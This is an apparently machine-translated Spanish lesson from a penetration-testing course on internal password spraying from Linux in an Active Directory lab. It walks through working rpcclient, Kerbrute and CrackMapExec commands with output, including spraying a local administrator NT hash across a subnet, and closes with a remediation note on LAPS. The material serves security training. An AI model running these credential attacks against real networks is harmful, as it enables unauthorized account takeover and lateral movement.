# Pulverización de contraseña interna: de Linux

---

Ahora que hemos creado una lista de palabras utilizando uno de los métodos descritos en las secciones anteriores, es hora de ejecutar nuestro ataque. Las siguientes secciones nos permitirán practicar la pulverización de contraseñas desde los hosts de Linux y Windows. Este es un enfoque clave para nosotros, ya que es una de las dos vías principales para obtener credenciales de dominio para el acceso, pero que también debemos proceder con cautela.

---

## Rociación de contraseña interna de un host de Linux

Una vez que hemos creado una lista de palabras utilizando uno de los métodos que se muestran en la sección anterior, es hora de ejecutar el ataque.`Rpcclient`es una excelente opción para realizar este ataque desde Linux. Una consideración importante es que un inicio de sesión válido no es aparente inmediatamente con`rpcclient`, con la respuesta`Authority Name`indicando un inicio de sesión exitoso. Podemos filtrar intentos de inicio de sesión no válidos de`grepping`para`Authority`En la respuesta. La siguiente línea de un enlace (adaptado de[aquí](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)) se puede usar para realizar el ataque.

#### Usando una línea de una línea de un ataque para el ataque

  Pulverización de contraseña interna: de Linux

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Intentemos esto contra el entorno objetivo.

  Pulverización de contraseña interna: de Linux

```shell-session
xnoxos@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

También podemos usar`Kerbrute`para el mismo ataque que se discutió anteriormente.

#### Usando Kerbrute para el ataque

  Pulverización de contraseña interna: de Linux

```shell-session
xnoxos@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

Existen varios otros métodos para realizar la pulverización de contraseñas desde Linux. Otra gran opción es usar`CrackMapExec`. La herramienta siempre versátil acepta un archivo de texto de nombres de usuario que se ejecutará contra una sola contraseña en un ataque de pulverización. Aquí estamos Grep por`+`Para filtrar las fallas de inicio de sesión y perfeccionar solo intentos de inicio de sesión válidos para asegurarnos de que no nos perdamos nada desplazándonos a través de muchas líneas de salida.

#### Uso de fallas de inicio de sesión de crackmapexec y filtrado

  Pulverización de contraseña interna: de Linux

```shell-session
xnoxos@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

Después de obtener uno (¡o más!) Hits con nuestro ataque de pulverización de contraseña, luego podemos usar`CrackMapExec`para validar las credenciales rápidamente contra un controlador de dominio.

#### Validando las credenciales con CrackMapexec

  Pulverización de contraseña interna: de Linux

```shell-session
xnoxos@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

---

## Reutilización de contraseña del administrador local

La pulverización interna de contraseña no solo es posible con cuentas de usuario de dominio. Si obtiene acceso administrativo y la contraseña de contraseña NTLM o la contraseña de ClearText para la cuenta de administrador local (u otra cuenta local privilegiada), esto se puede intentar en múltiples hosts en la red. La reutilización de contraseña de la cuenta del administrador local está muy extendido debido al uso de imágenes de oro en implementaciones automatizadas y la facilidad de gestión percibida al hacer cumplir la misma contraseña en múltiples hosts.

CrackMapexec es una herramienta útil para intentar este ataque. Vale la pena apuntar a hosts de alto valor como`SQL`o`Microsoft Exchange`Servidores, ya que es más probable que un usuario altamente privilegiado inicie sesión o tenga sus credenciales persistentes en la memoria.

Cuando se trabaja con cuentas de administrador local, una consideración es la reutilización de contraseña o los formatos de contraseña comunes en todas las cuentas. Si encontramos un host de escritorio con la contraseña de cuenta de administrador local establecida en algo único como`$desktop%@admin123`, podría valer la pena intentar`$server%@admin123`contra servidores. Además, si encontramos cuentas de administrador locales no estándar como`bsmith`, podemos encontrar que la contraseña se reutiliza para una cuenta de usuario de dominio con nombre similar. El mismo principio puede aplicarse a las cuentas de dominio. Si recuperamos la contraseña para un usuario nombrado`ajones`, vale la pena probar la misma contraseña en su cuenta de administración (si el usuario tiene una), por ejemplo,`ajones_adm`, para ver si están reutilizando sus contraseñas. Esto también es común en situaciones de confianza de dominio. Podemos obtener credenciales válidas para un usuario en el dominio A que sean válidos para un usuario con el mismo nombre de usuario o similar en el dominio B o viceversa.

A veces solo podemos recuperar el hash NTLM para la cuenta de administrador local de la base de datos SAM local. En estos casos, podemos rociar el hash NT en una subred completa (o subredes múltiples) para buscar cuentas de administrador local con la misma contraseña establecida. En el siguiente ejemplo, intentamos autenticarnos con todos los hosts en la red A /23 utilizando la cuenta de administrador local incorporada NT hash recuperado de otra máquina. El`--local-auth`Flag le dirá a la herramienta solo que intente iniciar sesión una vez en cada máquina, lo que elimina cualquier riesgo de bloqueo de cuenta.`Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain`. De manera predeterminada, sin el conjunto de opciones de Auth Local, la herramienta intentará autenticarse usando el dominio actual, lo que podría dar lugar rápidamente a los bloqueos de la cuenta.

#### Rociación de administrador local con crackmapexec

  Pulverización de contraseña interna: de Linux

```shell-session
xnoxos@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

La salida anterior muestra que las credenciales eran válidas como administrador local en`3`sistemas en el`172.16.5.0/23`subred. Entonces podríamos avanzar para enumerar cada sistema para ver si podemos encontrar algo que ayude a promover nuestro acceso.

Esta técnica, aunque efectiva, es bastante ruidosa y no es una buena opción para ninguna evaluación que requiere sigilo. Siempre vale la pena buscar este problema durante las pruebas de penetración, incluso si no es parte de nuestro camino para comprometer el dominio, ya que es un problema común y debe destacarse para nuestros clientes. Una forma de remediar este problema es usar la herramienta gratuita de Microsoft.[Solución de contraseña de administrador local (vueltas)](https://www.microsoft.com/en-us/download/details.aspx?id=46899)Para que Active Directory administre las contraseñas de administrador local y aplique una contraseña única en cada host que gira en un intervalo establecido.